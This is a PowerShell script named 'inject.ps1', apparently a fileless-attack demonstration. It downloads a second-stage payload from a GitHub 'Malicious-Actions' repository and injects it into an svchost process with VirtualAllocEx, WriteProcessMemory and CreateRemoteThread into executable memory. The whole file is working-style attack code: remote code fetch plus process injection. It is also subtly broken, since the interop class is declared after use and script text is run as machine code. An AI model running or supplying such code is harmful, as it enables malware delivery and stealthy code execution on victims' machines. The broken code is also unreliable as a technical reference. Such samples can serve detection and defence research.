# inject.ps1

# Download the second-stage payload
$payloadUrl = "https://raw.githubusercontent.com/norsemen-local/Malicious-Actions/main/Case%201%20-%20Fileless%20Attack/payload.ps1"
$payload = Invoke-WebRequest -Uri $payloadUrl -UseBasicParsing | Select-Object -ExpandProperty Content

# Choose a common process for injection
$processName = "svchost" # Alternatively, use "notepad", "svchost", etc.
$process = Get-Process -Name $processName | Select-Object -First 1

# Create a byte array of the payload
$payloadBytes = [System.Text.Encoding]::Unicode.GetBytes($payload)

# Get handle to the target process
$processHandle = [System.Diagnostics.Process]::GetProcessById($process.Id).Handle

# Allocate memory in the target process
$memoryAllocation = [Kernel32]::VirtualAllocEx($processHandle, [IntPtr]::Zero, $payloadBytes.Length, 0x1000 -bor 0x2000, 0x40)

# Write the payload to the allocated memory
[Kernel32]::WriteProcessMemory($processHandle, $memoryAllocation, $payloadBytes, $payloadBytes.Length, [ref]0)

# Create a remote thread in the target process
$remoteThread = [Kernel32]::CreateRemoteThread($processHandle, [IntPtr]::Zero, 0, $memoryAllocation, [IntPtr]::Zero, 0, [ref]0)

# Import necessary functions from kernel32.dll
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Kernel32 {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, ref int lpNumberOfBytesWritten);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, ref IntPtr lpThreadId);
}
"@
